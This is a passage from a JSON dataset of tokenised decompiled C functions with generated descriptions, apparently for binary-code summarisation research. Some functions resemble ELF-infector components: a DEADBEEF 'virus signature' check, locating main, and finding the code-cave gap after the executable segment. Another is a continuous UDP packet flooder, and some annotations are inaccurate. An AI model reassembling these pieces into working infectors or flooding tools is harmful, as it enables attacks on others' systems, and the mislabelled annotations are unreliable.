            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "510",
            ")",
            ";",
            "HIWORD",
            "(",
            "buf",
            "[",
            "0",
            "]",
            ")",
            "=",
            "__ROL2__",
            "(",
            "LOWORD",
            "(",
            "buf",
            "[",
            "6",
            "]",
            ")",
            "+",
            "8",
            ",",
            "8",
            ")",
            ";",
            "v2",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "a1",
            "+",
            "19",
            ")",
            "=",
            "=",
            "0",
            ";",
            "v3",
            "=",
            "LOWORD",
            "(",
            "buf",
            "[",
            "6",
            "]",
            ")",
            "+",
            "28",
            ";",
            "buf",
            "[",
            "6",
            "]",
            "=",
            "(",
            "unsigned",
            "__int16",
            ")",
            "__ROL2__",
            "(",
            "buf",
            "[",
            "6",
            "]",
            ",",
            "8",
            ")",
            ";",
            "n",
            "=",
            "v3",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "HIWORD",
            "(",
            "buf",
            "[",
            "5",
            "]",
            ")",
            "=",
            "4",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "v12",
            ".",
            "sa_data",
            "[",
            "6",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "(",
            "int",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ";",
            "v12",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "v12",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "buf",
            "[",
            "4",
            "]",
            ";",
            "v11",
            ".",
            "tv_sec",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "v12",
            ".",
            "sa_data",
            "=",
            "HIWORD",
            "(",
            "buf",
            "[",
            "5",
            "]",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "v11",
            ".",
            "tv_nsec",
            "=",
            "(",
            "int",
            ")",
            "(",
            "v4",
            "/",
            "v5",
            "/",
            "5",
            ")",
            "*",
            "v5",
            "*",
            "(",
            "0x3B9ACA00",
            "/",
            "v4",
            ")",
            ";",
            "v6",
            "=",
            "(",
            "pthread_mutex_t",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a1",
            "+",
            "2056",
            ")",
            ";",
            "v7",
            "=",
            "0L",
            "L",
            ";",
            "v8",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "sendto",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "511",
            ")",
            ",",
            "buf",
            ",",
            "v3",
            ",",
            "0",
            ",",
            "&",
            "v12",
            ",",
            "0x10u",
            ")",
            ";",
            ";",
            "i",
            "=",
            "sendto",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            "+",
            "511",
            ")",
            ",",
            "buf",
            ",",
            "n",
            ",",
            "0",
            ",",
            "&",
            "v12",
            ",",
            "0x10u",
            ")",
            ")",
            "{",
            "if",
            "(",
            "i",
            "<",
            "0",
            ")",
            "perror",
            "(",
            "\"udp_sendto\"",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ")",
            "puts",
            "(",
            "\"UDP sent \"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "a1",
            "+",
            "19",
            ")",
            ")",
            "HIWORD",
            "(",
            "buf",
            "[",
            "5",
            "]",
            ")",
            "=",
            "__ROL2__",
            "(",
            "v7",
            "%",
            "0xEA60",
            "+",
            "1024",
            ",",
            "8",
            ")",
            ";",
            "if",
            "(",
            "v8",
            "<",
            "(",
            "int",
            ")",
            "(",
            "v4",
            "/",
            "v5",
            "/",
            "5",
            ")",
            ")",
            "{",
            "+",
            "+",
            "v8",
            ";",
            "}",
            "else",
            "{",
            "pthread_mutex_lock",
            "(",
            "v6",
            ")",
            ";",
            "*",
            "(",
            "(",
            "__m128i",
            "*",
            ")",
            "a1",
            "+",
            "131",
            ")",
            "=",
            "_mm_add_epi64",
            "(",
            "_mm_unpacklo_epi64",
            "(",
            "(",
            "__m128i",
            ")",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v8",
            ",",
            "(",
            "__m128i",
            ")",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "int",
            ")",
            "(",
            "n",
            "*",
            "v8",
            ")",
            ")",
            ",",
            "_mm_loadu_si128",
            "(",
            "(",
            "const",
            "__m128i",
            "*",
            ")",
            "a1",
            "+",
            "131",
            ")",
            ")",
            ";",
            "pthread_mutex_unlock",
            "(",
            "v6",
            ")",
            ";",
            "v8",
            "=",
            "1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ")",
            ")",
            "nanosleep",
            "(",
            "&",
            "v11",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "}",
            "+",
            "+",
            "v7",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function ` function \"__read\" seems to be involved in low-level I/O operations, potentially related to device interaction, file system operations, or checkpointing processes, and"
        ],
        "longer_label": "The provided code appears to be a function responsible for generating and continuously sending UDP packets, utilizing low-level I/O operations, mutex locking, and nanosleep for timing control, with potential annotations related to the \"__read\" function."
    },
    {
        "id": 333,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "and",
            "configures",
            "network",
            "packet",
            "parameters",
            "and",
            "threads",
            "based",
            "on",
            "user",
            "input",
            "options",
            ",",
            "then",
            "creates",
            "threads",
            "for",
            "generating",
            "and",
            "sending",
            "packets",
            "while",
            "continuously",
            "monitoring",
            "and",
            "displaying",
            "statistics",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "char",
            "v3",
            ";",
            "unsigned",
            "__int8",
            "v4",
            ";",
            "pthread_t",
            "*",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "__int64",
            "v8",
            "[",
            "266",
            "]",
            ";",
            "pthread_t",
            "newthread",
            "[",
            "521",
            "]",
            ";",
            "newthread",
            "[",
            "513",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "v8",
            ",",
            "0",
            ",",
            "0x848uL",
            "L",
            ")",
            ";",
            "inet_aton",
            "(",
            "\"127.0.0.1\"",
            ",",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "&",
            "v8",
            "[",
            "3",
            "]",
            "+",
            "1",
            ")",
            ";",
            "inet_aton",
            "(",
            "\"127.0.0.1\"",
            ",",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "&",
            "v8",
            "[",
            "4",
            "]",
            ")",
            ";",
            "HIDWORD",
            "(",
            "v8",
            "[",
            "4",
            "]",
            ")",
            "=",
            "1862315528",
            ";",
            "LOWORD",
            "(",
            "v8",
            "[",
            "5",
            "]",
            ")",
            "=",
            "25600",
            ";",
            "HIDWORD",
            "(",
            "v8",
            "[",
            "0",
            "]",
            ")",
            "=",
            "1",
            ";",
            "HIDWORD",
            "(",
            "v8",
            "[",
            "264",
            "]",
            ")",
            "=",
            "1",
            ";",
            "v8",
            "[",
            "1",
            "]",
            "=",
            "100L",
            "L",
            ";",
            "LODWORD",
            "(",
            "v8",
            "[",
            "256",
            "]",
            ")",
            "=",
            "51200",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v3",
            "=",
            "getopt",
            "(",
            "argc",
            ",",
            "(",
            "char",
            "*",
            "const",
            "*",
            ")",
            "argv",
            ",",
            "\"?vs:d:S:D:l:c:t:r:p:B:\"",
            ")",
            ";",
            "if",
            "(",
            "v3",
            "=",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "v4",
            "=",
            "v3",
            "-",
            "63",
            ";",
            "if",
            "(",
            "v4",
            "<",
            "=",
            "0x37u",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "}",
            "LODWORD",
            "(",
            "v8",
            "[",
            "264",
            "]",
            ")",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "sock_init",
            "(",
            "(",
            "__int64",
            ")",
            "v8",
            ")",
            ";",
            "if",
            "(",
            "pthread_mutex_init",
            "(",
            "(",
            "pthread_mutex_t",
            "*",
            ")",
            "&",
            "v8",
            "[",
            "257",
            "]",
            ",",
            "0L",
            "L",
            ")",
            ")",
            "perror",
            "(",
            "\"pthread_mutex_init error\"",
            ")",
            ";",
            "if",
            "(",
            "SHIDWORD",
            "(",
            "v8",
            "[",
            "0",
            "]",
            ")",
            ">",
            "0",
            ")",
            "{",
            "v5",
            "=",
            "newthread",
            ";",
            "v6",
            "=",
            "0",
            ";",
            "do",
            "{",
            "while",
            "(",
            "!",
            "pthread_create",
            "(",
            "v5",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "gen_pkt_loop",
            ",",
            "v8",
            ")",
            ")",
            "{",
            "+",
            "+",
            "v6",
            ";",
            "+",
            "+",
            "v5",
            ";",
            "if",
            "(",
            "SHIDWORD",
            "(",
            "v8",
            "[",
            "0",
            "]",
            ")",
            "<",
            "=",
            "v6",
            ")",
            "goto",
            "LABEL_11",
            ";",
            "}",
            "+",
            "+",
            "v6",
            ";",
            "+",
            "+",
            "v5",
            ";",
            "perror",
            "(",
            "\"Pthread_create error\"",
            ")",
            ";",
            "}",
            "while",
            "(",
            "v6",
            "<",
            "SHIDWORD",
            "(",
            "v8",
            "[",
            "0",
            "]",
            ")",
            ")",
            ";",
            "}",
            "LABEL_11",
            ":",
            "stats_loop",
            "(",
            "(",
            "__int64",
            ")",
            "v8",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `readfsqword` reads a 64-bit value from the FS segment register and assigns it to `v23`, likely used for system-level operations such as memory management or low-level CPU state retrieval."
        ],
        "longer_label": "The provided code is a C program which initializes network settings, performs command line argument parsing, initializes thread synchronization primitives, creates multiple threads to execute a packet generation loop, and continuously monitors statistics, likely for network monitoring or testing purposes."
    },
    {
        "id": 334,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "for",
            "a",
            "specific",
            "virus",
            "signature",
            "in",
            "a",
            "file",
            "specified",
            "by",
            "the",
            "argument",
            "passed",
            "to",
            "the",
            "function",
            "and",
            "returns",
            "1",
            "if",
            "the",
            "virus",
            "signature",
            "is",
            "found",
            ",",
            "otherwise",
            "returns",
            "0",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "argv",
            ")",
            "{",
            "char",
            "offBuf",
            ";",
            "int",
            "offsetState",
            ";",
            "int",
            "fd",
            ";",
            "stat",
            "fstatInfo",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "fd",
            "=",
            "syscall",
            "(",
            "2L",
            "L",
            ",",
            "argv",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "return",
            "-",
            "1",
            ";",
            "if",
            "(",
            "fstat",
            "(",
            "fd",
            ",",
            "&",
            "fstatInfo",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ")",
            ";",
            "return",
            "-",
            "1",
            ";",
            "}",
            "else",
            "{",
            "offsetState",
            "=",
            "0",
            ";",
            "offBuf",
            "=",
            "0",
            ";",
            "while",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "read",
            "(",
            "fd",
            ",",
            "&",
            "offBuf",
            ",",
            "1uL",
            "L",
            ")",
            "=",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "offsetState",
            "|",
            "|",
            "(",
            "unsigned",
            "__int8",
            ")",
            "offBuf",
            "!",
            "=",
            "222",
            ")",
            "{",
            "switch",
            "(",
            "offsetState",
            ")",
            "{",
            "case",
            "1",
            ":",
            "if",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "offBuf",
            "=",
            "=",
            "173",
            ")",
            "offsetState",
            "=",
            "2",
            ";",
            "else",
            "offsetState",
            "=",
            "0",
            ";",
            "break",
            ";",
            "case",
            "2",
            ":",
            "if",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "offBuf",
            "=",
            "=",
            "190",
            ")",
            "offsetState",
            "=",
            "3",
            ";",
            "else",
            "offsetState",
            "=",
            "0",
            ";",
            "break",
            ";",
            "case",
            "3",
            ":",
            "if",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "offBuf",
            "=",
            "=",
            "239",
            ")",
            "{",
            "offsetState",
            "=",
            "4",
            ";",
            "goto",
            "LABEL_22",
            ";",
            "}",
            "offsetState",
            "=",
            "0",
            ";",
            "break",
            ";",
            "}",
            "}",
            "else",
            "{",
            "offsetState",
            "=",
            "1",
            ";",
            "}",
            "}",
            "LABEL_22",
            ":",
            "syscall",
            "(",
            "3L",
            "L",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "fd",
            ")",
            ";",
            "return",
            "offsetState",
            "=",
            "=",
            "4",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` appears to be a low-level read operation implementation, possibly for device drivers or file systems, involving memory allocation, device access, and potentially system calls, primarily designed for reading data from a device or file.",
            "The `syscall` function, along with associated code snippets, seems to be part of an operating system or kernel implementation for ARM64 architecture, handling system calls and privileged errors by invoking exceptions with appropriate opcodes."
        ],
        "longer_label": "The code is a function in C that checks for a specific byte pattern (222, 173, 190, 239) in a file specified by the `argv` argument using low-level file operations and system calls, returning `true` if the pattern is found and `false` otherwise, with annotations describing the function and its implementation in an ARM64 architecture."
    },
    {
        "id": 335,
        "docstring_tokens": [
            "The",
            "code",
            "parses",
            "TCP",
            "packets",
            ",",
            "extracts",
            "source",
            "and",
            "destination",
            "ports",
            ",",
            "and",
            "prints",
            "payload",
            "information",
            "if",
            "present",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "u_char",
            "*",
            "args",
            ",",
            "const",
            "pcap_pkthdr",
            "*",
            "pkthdr",
            ",",
            "const",
            "u_char",
            "*",
            "packet",
            ")",
            "{",
            "uint16_t",
            "v3",
            ";",
            "uint16_t",
            "v4",
            ";",
            "int",
            "size_payload",
            ";",
            "int",
            "size_tcp",
            ";",
            "int",
            "size_ip",
            ";",
            "const",
            "sniff_tcp",
            "*",
            "tcp",
            ";",
            "puts",
            "(",
            "\"TCP Packet\"",
            ")",
            ";",
            "size_ip",
            "=",
            "4",
            "*",
            "(",
            "packet",
            "[",
            "14",
            "]",
            "&",
            "0xF",
            ")",
            ";",
            "tcp",
            "=",
            "(",
            "const",
            "sniff_tcp",
            "*",
            ")",
            "&",
            "packet",
            "[",
            "size_ip",
            "+",
            "14",
            "]",
            ";",
            "size_tcp",
            "=",
            "4",
            "*",
            "(",
            "tcp",
            "-",
            ">",
            "th_offx2",
            ">",
            ">",
            "4",
            ")",
            ";",
            "if",
            "(",
            "size_tcp",
            "<",
            "=",
            "19",
            ")",
            "{",
            "perror",
            "(",
            "\"TCP: Control packet length is incorrect\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "v3",
            "=",
            "ntohs",
            "(",
            "tcp",
            "-",
            ">",
            "th_sport",
            ")",
            ";",
            "printf",
            "(",
            "\"Source port: %d\\n\"",
            ",",
            "v3",
            ")",
            ";",
            "v4",
            "=",
            "ntohs",
            "(",
            "tcp",
            "-",
            ">",
            "th_dport",
            ")",
            ";",
            "printf",
            "(",
            "\"Destination port: %d\\n\"",
            ",",
            "v4",
            ")",
            ";",
            "size_payload",
            "=",
            "ntohs",
            "(",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "packet",
            "+",
            "8",
            ")",
            ")",
            "-",
            "(",
            "size_ip",
            "+",
            "size_tcp",
            ")",
            ";",
            "if",
            "(",
            "size_payload",
            ">",
            "0",
            ")",
            "{",
            "printf",
            "(",
            "\"Payload (%d bytes):\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "size_payload",
            ")",
            ";",
            "ParsePayload",
            "(",
            "&",
            "packet",
            "[",
            "size_ip",
            "+",
            "14",
            "+",
            "(",
            "__int64",
            ")",
            "size_tcp",
            "]",
            ",",
            "size_payload",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function is being redefined and its usage is extended to include an RPN calculator and system-specific formatting features in the provided code snippets.",
            "Without any code snippets to analyze, it's difficult to determine the exact purpose of the \"Parse\" function. However, typically a \"Parse\" function is used to analyze or extract structured data from a given input, such as parsing a string to extract specific information like numbers or dates."
        ],
        "longer_label": "The provided code defines a function `ParseTCP` that parses TCP packets, extracts information such as source and destination ports, checks for correct packet length, and if payload exists, invokes a function `ParsePayload` to further parse the payload data."
    },
    {
        "id": 336,
        "docstring_tokens": [
            "The",
            "function",
            "open_and_map",
            "opens",
            "a",
            "file",
            "specified",
            "by",
            "fname",
            ",",
            "maps",
            "its",
            "contents",
            "to",
            "a",
            "uint8_t",
            "pointer",
            "data",
            ",",
            "and",
            "sets",
            "the",
            "size",
            "of",
            "the",
            "file",
            "to",
            "len",
            ",",
            "returning",
            "the",
            "file",
            "descriptor",
            "if",
            "successful",
            "or",
            "-1",
            "if",
            "an",
            "error",
            "occurs",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "fname",
            ",",
            "uint8_t",
            "*",
            "*",
            "data",
            ",",
            "size_t",
            "*",
            "len",
            ")",
            "{",
            "int",
            "fd",
            ";",
            "__off_t",
            "size",
            ";",
            "stat",
            "st",
            ";",
            "unsigned",
            "__int64",
            "v8",
            ";",
            "v8",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "fd",
            "=",
            "open",
            "(",
            "fname",
            ",",
            "1026",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "<",
            "0",
            ")",
            "return",
            "-",
            "1",
            ";",
            "if",
            "(",
            "fstat",
            "(",
            "fd",
            ",",
            "&",
            "st",
            ")",
            ")",
            "return",
            "-",
            "1",
            ";",
            "size",
            "=",
            "st",
            ".",
            "st_size",
            ";",
            "*",
            "data",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "mmap",
            "(",
            "0L",
            "L",
            ",",
            "st",
            ".",
            "st_size",
            ",",
            "7",
            ",",
            "1",
            ",",
            "fd",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "*",
            "data",
            "=",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "-",
            "1L",
            "L",
            ")",
            "return",
            "-",
            "1",
            ";",
            "*",
            "len",
            "=",
            "size",
            ";",
            "return",
            "fd",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a quadword (64 bits) from the FS segment register at a specified offset, primarily in low-level system programming or kernel development, potentially for accessing thread-local storage or other system-specific data structures."
        ],
        "longer_label": "The given code defines a function `open_and_map` that attempts to open a file specified by `fname`, map it into memory, and return a file descriptor while populating `data` with a pointer to the mapped memory and `len` with the file size, utilizing low-level system functions and likely intended for low-level system programming or kernel development."
    },
    {
        "id": 337,
        "docstring_tokens": [
            "The",
            "function",
            "unmaps",
            "memory",
            ",",
            "synchronizes",
            "changes",
            "to",
            "disk",
            ",",
            "and",
            "closes",
            "a",
            "file",
            "descriptor",
            ",",
            "returning",
            "a",
            "success",
            "status",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "fd",
            ",",
            "uint8_t",
            "*",
            "data",
            ",",
            "size_t",
            "len",
            ")",
            "{",
            "int",
            "success",
            ";",
            "int",
            "successa",
            ";",
            "success",
            "=",
            "msync",
            "(",
            "data",
            ",",
            "len",
            ",",
            "4",
            ")",
            ";",
            "successa",
            "=",
            "munmap",
            "(",
            "data",
            ",",
            "len",
            ")",
            "|",
            "success",
            ";",
            "return",
            "close",
            "(",
            "fd",
            ")",
            "|",
            "successa",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code unmaps memory, closes a file descriptor, and returns the result of the operations, with annotations left blank."
    },
    {
        "id": 338,
        "docstring_tokens": [
            "The",
            "code",
            "finds",
            "the",
            "main",
            "function",
            "address",
            "in",
            "an",
            "ELF",
            "binary",
            "file",
            "and",
            "stores",
            "it",
            "in",
            "the",
            "main_arg_t",
            "structure",
            ",",
            "returning",
            "-1",
            "if",
            "the",
            "main",
            "function",
            "can",
            "not",
            "be",
            "found",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "uint8_t",
            "*",
            "elf_base",
            ",",
            "main_arg_t_0",
            "*",
            "res",
            ")",
            "{",
            "int",
            "i",
            ";",
            "uint8_t",
            "*",
            "cursor",
            ";",
            "uint8_t",
            "*",
            "cursora",
            ";",
            "uint8_t",
            "*",
            "cursorb",
            ";",
            "uint8_t",
            "*",
            "cursorc",
            ";",
            "uint64_t",
            "section_vaddr",
            ";",
            "uint64_t",
            "section_size",
            ";",
            "uint64_t",
            "text_file_offset",
            ";",
            "uint64_t",
            "startoff",
            ";",
            "uint64_t",
            "startoffa",
            ";",
            "char",
            "s2",
            ";",
            "char",
            "v14",
            ";",
            "char",
            "v15",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "text_file_offset",
            "=",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "elf_base",
            "[",
            "4",
            "]",
            "=",
            "=",
            "1",
            ")",
            "return",
            "-",
            "1",
            ";",
            "startoff",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "elf_base",
            "+",
            "3",
            ")",
            ";",
            "cursor",
            "=",
            "&",
            "elf_base",
            "[",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "elf_base",
            "+",
            "5",
            ")",
            "]",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "*",
            "(",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "elf_base",
            "+",
            "30",
            ")",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "section_vaddr",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor",
            "+",
            "2",
            ")",
            ";",
            "section_size",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor",
            "+",
            "4",
            ")",
            ";",
            "if",
            "(",
            "section_vaddr",
            "<",
            "=",
            "startoff",
            "&",
            "&",
            "startoff",
            "<",
            "section_vaddr",
            "+",
            "section_size",
            ")",
            "{",
            "text_file_offset",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor",
            "+",
            "3",
            ")",
            ";",
            "break",
            ";",
            "}",
            "cursor",
            "+",
            "=",
            "*",
            "(",
            "(",
            "unsigned",
            "__int16",
            "*",
            ")",
            "elf_base",
            "+",
            "29",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "text_file_offset",
            ")",
            "return",
            "-",
            "1",
            ";",
            "startoffa",
            "=",
            "startoff",
            "-",
            "section_vaddr",
            "+",
            "text_file_offset",
            ";",
            "cursora",
            "=",
            "&",
            "elf_base",
            "[",
            "startoffa",
            "]",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "s2",
            "=",
            "72",
            ";",
            "v14",
            "=",
            "-",
            "57",
            ";",
            "v15",
            "=",
            "-",
            "57",
            ";",
            "if",
            "(",
            "!",
            "memcmp",
            "(",
            "cursora",
            ",",
            "&",
            "s2",
            ",",
            "3uL",
            "L",
            ")",
            ")",
            "{",
            "cursorb",
            "=",
            "cursora",
            "+",
            "3",
            ";",
            "res",
            "-",
            ">",
            "file_ptr",
            "=",
            "cursorb",
            ";",
            "res",
            "-",
            ">",
            "addr_size",
            "=",
            "4L",
            "L",
            ";",
            "res",
            "-",
            ">",
            "rip",
            "=",
            "0L",
            "L",
            ";",
            "res",
            "-",
            ">",
            "main_addr",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "*",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "cursorb",
            ";",
            "return",
            "0",
            ";",
            "}",
            "s2",
            "=",
            "72",
            ";",
            "v14",
            "=",
            "-",
            "115",
            ";",
            "v15",
            "=",
            "61",
            ";",
            "if",
            "(",
            "!",
            "memcmp",
            "(",
            "cursora",
            ",",
            "&",
            "s2",
            ",",
            "3uL",
            "L",
            ")",
            ")",
            "break",
            ";",
            "if",
            "(",
            "+",
            "+",
            "cursora",
            ">",
            "=",
            "&",
            "elf_base",
            "[",
            "section_size",
            "+",
            "startoffa",
            "]",
            ")",
            "return",
            "-",
            "1",
            ";",
            "}",
            "cursorc",
            "=",
            "cursora",
            "+",
            "3",
            ";",
            "res",
            "-",
            ">",
            "file_ptr",
            "=",
            "cursorc",
            ";",
            "res",
            "-",
            ">",
            "addr_size",
            "=",
            "4L",
            "L",
            ";",
            "res",
            "-",
            ">",
            "rip",
            "=",
            "(",
            "uint8_t",
            "*",
            ")",
            "(",
            "&",
            "cursorc",
            "[",
            "section_vaddr",
            "+",
            "4",
            "]",
            "-",
            "elf_base",
            "-",
            "text_file_offset",
            ")",
            ";",
            "res",
            "-",
            ">",
            "main_addr",
            "=",
            "&",
            "res",
            "-",
            ">",
            "rip",
            "[",
            "*",
            "(",
            "int",
            "*",
            ")",
            "cursorc",
            "]",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a C function that takes the base address of an ELF file and a structure pointer, and then searches for and extracts information related to the main function's arguments from the ELF file."
    },
    {
        "id": 339,
        "docstring_tokens": [
            "The",
            "code",
            "finds",
            "the",
            "gap",
            "between",
            "executable",
            "sections",
            "and",
            "updates",
            "the",
            "empty_area_t",
            "structure",
            "with",
            "the",
            "gap",
            "size",
            "and",
            "file",
            "offset",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "uint8_t",
            "*",
            "elf_base",
            ",",
            "empty_area_t_0",
            "*",
            "area",
            ")",
            "{",
            "uint16_t",
            "phentsize",
            ";",
            "uint16_t",
            "phnum",
            ";",
            "int",
            "i",
            ";",
            "int",
            "ia",
            ";",
            "uint8_t",
            "*",
            "cursor",
            ";",
            "uint8_t",
            "*",
            "cursora",
            ";",
            "uint64_t",
            "text_end",
            ";",
            "uint64_t",
            "pad_len",
            ";",
            "uint64_t",
            "phoff",
            ";",
            "uint64_t",
            "poff",
            ";",
            "uint64_t",
            "psz",
            ";",
            "text_end",
            "=",
            "0L",
            "L",
            ";",
            "pad_len",
            "=",
            "-",
            "1L",
            "L",
            ";",
            "phoff",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "elf_base",
            "+",
            "4",
            ")",
            ";",
            "phentsize",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "elf_base",
            "+",
            "27",
            ")",
            ";",
            "phnum",
            "=",
            "*",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "elf_base",
            "+",
            "28",
            ")",
            ";",
            "cursor",
            "=",
            "&",
            "elf_base",
            "[",
            "phoff",
            "]",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "phnum",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "psz",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor",
            "+",
            "4",
            ")",
            ";",
            "if",
            "(",
            "(",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "cursor",
            "+",
            "1",
            ")",
            "&",
            "0x11",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "cursor",
            "=",
            "=",
            "1",
            ")",
            "{",
            "text_end",
            "=",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor",
            "+",
            "1",
            ")",
            "+",
            "psz",
            ";",
            "area",
            "-",
            ">",
            "vaddr",
            "=",
            "psz",
            "+",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "cursor",
            "+",
            "2",
            ")",
            ";",
            "break",
            ";",
            "}",
            "cursor",
            "+",
            "=",
            "phentsize",
            ";",
            "}",
            "if",
            "(",
            "!",
            "text_end",
            ")",
